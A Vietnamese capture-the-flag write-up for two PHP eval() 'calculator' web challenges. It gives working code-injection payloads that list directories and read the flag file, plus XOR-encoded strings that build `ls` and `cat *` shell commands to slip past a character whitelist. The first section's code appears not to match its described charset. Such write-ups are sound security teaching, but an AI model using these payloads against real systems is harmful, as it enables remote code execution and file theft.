# WEB
## HPNY
- Link tham khảo: https://tsublogs.wordpress.com/2018/12/13/wargame-code-breaking-com-solution/
- Source code:
```
 <!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->

<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
} 
```
- Đề bài chỉ cho phép sử dụng các kí tự từ 'a' đến 'z', '(', ')', '_' và '.'
- Do phần nội dung được nhập vào được thực thi bởi `eval()` nên có thể bị dính lỗi dạng code/command execution.
- Thử với `system(ls)`:
![system(ls)](./images/Selection_001.png)

- Thay vì sử dụng command execution, ta có thể sử dụng dạng code execution: `print_r(scandir(getcwd()))`
![scandir(getcwd())](./images/Selection_002.png)

- Lấy tên file flag: `print_r(next(array_reverse(scandir(getcwd()))))`
![get flag's filename](./images/Selection_003.png)

- Đọc nội dung flag: `readfile(next(array_reverse(scandir(getcwd()))))`
![flag](./images/Selection_004.png)

## super_calc
- Link tham khảo: https://ironhackers.es/en/tutoriales/saltandose-waf-ejecucion-de-codigo-php-sin-letras/
- Source code:
```
<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"]))
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}
```

- Đề bài chỉ cho phép sử dụng tập kí tự `['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '-', '*', '/', '(', ')', "'", '.', '~', '^', '|', '&']`
- Có thể sử dụng system() hoặc dấu backtick để thực thi các lệnh hệ thống.
 - Liệt kê các file hệ thống (`` `ls` ``): `'0840'^'.*9.'^'~~~~'`
 - Đọc file (`` `cat *` ``): `'0000000'^'.--880.'^'~~||(*~'`
